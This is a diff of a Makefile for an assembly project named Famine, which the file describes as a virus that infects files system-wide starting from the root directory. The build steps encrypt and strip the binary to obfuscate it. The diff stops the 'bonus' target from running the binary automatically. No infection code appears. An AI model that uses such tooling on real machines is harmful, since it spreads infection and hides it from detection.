@@ -2,11 +2,6 @@
 AS      = nasm
 ASFLAGS = -f elf64 -I includes -I sources
 
-# Verbose mode detection
-# Usage:
-#   make bonus verbose    (add verbose to any target)
-#   make V=1 bonus        (alternative using environment variable)
-#   V=1 make bonus        (environment variable before make command)
 ifneq (,$(filter verbose,$(MAKECMDGOALS)))
 ASFLAGS += -DVERBOSE_MODE
 endif
@@ -50,11 +45,10 @@ $(TARGET): $(OBJS)
 $(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR)
 	$(AS) $(ASFLAGS) $< -o $@
 
-# Build encrypt program
 
 obfuscate: $(TARGET) $(ENCRYPT)
-	./$(ENCRYPT) $(BIN_NAME)
-	strip ./$(BIN_NAME)
+	$(ENCRYPT) $(BIN_NAME)
+	strip $(BIN_NAME)
 
 $(ENCRYPT): $(ENCRYPT_OBJ)
 	ld $^ -o $@
@@ -80,10 +74,9 @@ bonus: fclean
 	ld $(OBJ_DIR)/main.o -o $(TARGET)
 	$(AS) $(ASFLAGS) $(ENCRYPT_S) -o $(ENCRYPT_OBJ)
 	ld $(ENCRYPT_OBJ) -o $(ENCRYPT)
-	./$(ENCRYPT)
+	$(ENCRYPT) $(TARGET)
 	@echo "WARNING: About to execute Famine targeting root directory /"
-	@echo "This will attempt to infect all files system-wide."
-	./$(TARGET)
+	@echo "Running the famine binary will attempt to infect all files system-wide."
 
 inspect:
 
